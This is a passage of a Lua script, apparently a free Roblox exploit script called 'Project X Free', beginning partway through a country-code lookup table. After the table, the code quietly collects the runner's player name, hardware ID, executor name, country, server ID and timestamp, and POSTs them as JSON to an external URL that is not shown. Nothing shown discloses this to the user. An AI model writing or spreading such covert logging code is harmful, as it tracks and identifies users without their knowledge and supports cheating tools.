    ["HM"] = "Heard Island and McDonald Islands",
    ["HN"] = "Honduras",
    ["HR"] = "Croatia",
    ["HT"] = "Haiti",
    ["HU"] = "Hungary",
    ["ID"] = "Indonesia",
    ["IE"] = "Ireland",
    ["IL"] = "Israel",
    ["IM"] = "Isle of Man",
    ["IN"] = "India",
    ["IO"] = "British Indian Ocean Territory",
    ["IQ"] = "Iraq",
    ["IR"] = "Iran",
    ["IS"] = "Iceland",
    ["IT"] = "Italy",
    ["JE"] = "Jersey",
    ["JM"] = "Jamaica",
    ["JO"] = "Jordan",
    ["JP"] = "Japan",
    ["KE"] = "Kenya",
    ["KG"] = "Kyrgyzstan",
    ["KH"] = "Cambodia",
    ["KI"] = "Kiribati",
    ["KM"] = "Comoros",
    ["KN"] = "Saint Kitts and Nevis",
    ["KP"] = "Korea, Democratic People's Republic of",
    ["KR"] = "Korea, Republic of",
    ["KW"] = "Kuwait",
    ["KY"] = "Cayman Islands",
    ["KZ"] = "Kazakhstan",
    ["LA"] = "Lao People's Democratic Republic",
    ["LB"] = "Lebanon",
    ["LC"] = "Saint Lucia",
    ["LI"] = "Liechtenstein",
    ["LK"] = "Sri Lanka",
    ["LR"] = "Liberia",
    ["LS"] = "Lesotho",
    ["LT"] = "Lithuania",
    ["LU"] = "Luxembourg",
    ["LV"] = "Latvia",
    ["LY"] = "Libya",
    ["MA"] = "Morocco",
    ["MC"] = "Monaco",
    ["MD"] = "Moldova",
    ["ME"] = "Montenegro",
    ["MF"] = "Saint Martin",
    ["MG"] = "Madagascar",
    ["MH"] = "Marshall Islands",
    ["MK"] = "North Macedonia",
    ["ML"] = "Mali",
    ["MM"] = "Myanmar",
    ["MN"] = "Mongolia",
    ["MO"] = "Macao",
    ["MP"] = "Northern Mariana Islands",
    ["MQ"] = "Martinique",
    ["MR"] = "Mauritania",
    ["MS"] = "Montserrat",
    ["MT"] = "Malta",
    ["MU"] = "Mauritius",
    ["MV"] = "Maldives",
    ["MW"] = "Malawi",
    ["MX"] = "Mexico",
    ["MY"] = "Malaysia",
    ["MZ"] = "Mozambique",
    ["NA"] = "Namibia",
    ["NC"] = "New Caledonia",
    ["NE"] = "Niger",
    ["NF"] = "Norfolk Island",
    ["NG"] = "Nigeria",
    ["NI"] = "Nicaragua",
    ["NL"] = "Netherlands",
    ["NO"] = "Norway",
    ["NP"] = "Nepal",
    ["NR"] = "Nauru",
    ["NU"] = "Niue",
    ["NZ"] = "New Zealand",
    ["OM"] = "Oman",
    ["PA"] = "Panama",
    ["PE"] = "Peru",
    ["PF"] = "French Polynesia",
    ["PG"] = "Papua New Guinea",
    ["PH"] = "Philippines",
    ["PK"] = "Pakistan",
    ["PL"] = "Poland",
    ["PM"] = "Saint Pierre and Miquelon",
    ["PN"] = "Pitcairn Islands",
    ["PR"] = "Puerto Rico",
    ["PT"] = "Portugal",
    ["PW"] = "Palau",
    ["PY"] = "Paraguay",
    ["QA"] = "Qatar",
    ["RE"] = "Réunion",
    ["RO"] = "Romania",
    ["RS"] = "Serbia",
    ["RU"] = "Russian Federation",
    ["RW"] = "Rwanda",
    ["SA"] = "Saudi Arabia",
    ["SB"] = "Solomon Islands",
    ["SC"] = "Seychelles",
    ["SD"] = "Sudan",
    ["SE"] = "Sweden",
    ["SG"] = "Singapore",
    ["SH"] = "Saint Helena",
    ["SI"] = "Slovenia",
    ["SJ"] = "Svalbard and Jan Mayen",
    ["SK"] = "Slovakia",
    ["SL"] = "Sierra Leone",
    ["SM"] = "San Marino",
    ["SN"] = "Senegal",
    ["SO"] = "Somalia",
    ["SR"] = "Suriname",
    ["SS"] = "South Sudan",
    ["ST"] = "Sao Tome and Principe",
    ["SV"] = "El Salvador",
    ["SX"] = "Sint Maarten",
    ["SY"] = "Syrian Arab Republic",
    ["SZ"] = "Eswatini",
    ["TC"] = "Turks and Caicos Islands",
    ["TD"] = "Chad",
    ["TF"] = "French Southern Territories",
    ["TG"] = "Togo",
    ["TH"] = "Thailand",
    ["TJ"] = "Tajikistan",
    ["TK"] = "Tokelau",
    ["TL"] = "Timor-Leste",
    ["TM"] = "Turkmenistan",
    ["TN"] = "Tunisia",
    ["TO"] = "Tonga",
    ["TR"] = "Turkey",
    ["TT"] = "Trinidad and Tobago",
    ["TV"] = "Tuvalu",
    ["TZ"] = "Tanzania",
    ["UA"] = "Ukraine",
    ["UG"] = "Uganda",
    ["UM"] = "United States Minor Outlying Islands",
    ["US"] = "United States",
    ["UY"] = "Uruguay",
    ["UZ"] = "Uzbekistan",
    ["VA"] = "Vatican City",
    ["VC"] = "Saint Vincent and the Grenadines",
    ["VE"] = "Venezuela",
    ["VG"] = "British Virgin Islands",
    ["VI"] = "United States Virgin Islands",
    ["VN"] = "Vietnam",
    ["VU"] = "Vanuatu",
    ["WF"] = "Wallis and Futuna",
    ["WS"] = "Samoa",
    ["YE"] = "Yemen",
    ["YT"] = "Mayotte",
    ["ZA"] = "South Africa",
    ["ZM"] = "Zambia",
    ["ZW"] = "Zimbabwe"
}

local function getCountryName(countryCode)
    return countryCodes[countryCode] or "Unknown Country"
end

local function getTimeWithTimezone()
    local currentTime = os.time()
    local formattedTime = os.date("%Y-%m-%d %H:%M:%S", currentTime)

    local function getTimezoneOffset()
        local utcTime = os.time(os.date("!*t", currentTime))
        local localTime = os.time(os.date("*t", currentTime))
        local diff = os.difftime(localTime, utcTime)
        local hours = math.floor(diff / 3600)
        local minutes = math.floor((diff % 3600) / 60)
        return string.format("%+03d:%02d", hours, minutes)
    end

    return formattedTime .. " " .. getTimezoneOffset()
end

local hwid = gethwid()

local identifyexecutor1 = identifyexecutor()

local success, countryCode = pcall(function()
    return LocalizationService:GetCountryRegionForPlayerAsync(player)
end)

local countryName = "Unknown Country"
if success then
    countryName = getCountryName(countryCode)
end

local playerName = player.Name
local timestamp = getTimeWithTimezone()
local gameLink = "https://www.roblox.com/games/" .. tostring(game.PlaceId)
local version = "Project X Free"
local serverId = game.JobId
local hwid = gethwid()
local identifyexecutor = identifyexecutor()

local data = {
    ["content"] = "Player Name: " .. playerName ..
                  ", Execution Time: " .. timestamp ..
                  ", Game Link: " .. gameLink ..
                  ", Version: " .. version ..
                  ", Server ID: " .. serverId ..
                  ", HWID: " .. hwid ..
                  ", Executor: " .. identifyexecutor1 ..
                  ", Country: " .. countryName
}

local newdata = HttpService:JSONEncode(data)

local headers = {
    ["content-type"] = "application/json"
}

local request = http_request or request or HttpPost or syn.request
local requestData = {
    Url = url,
    Body = newdata,
    Method = "POST",
    Headers = headers
}
request(requestData)
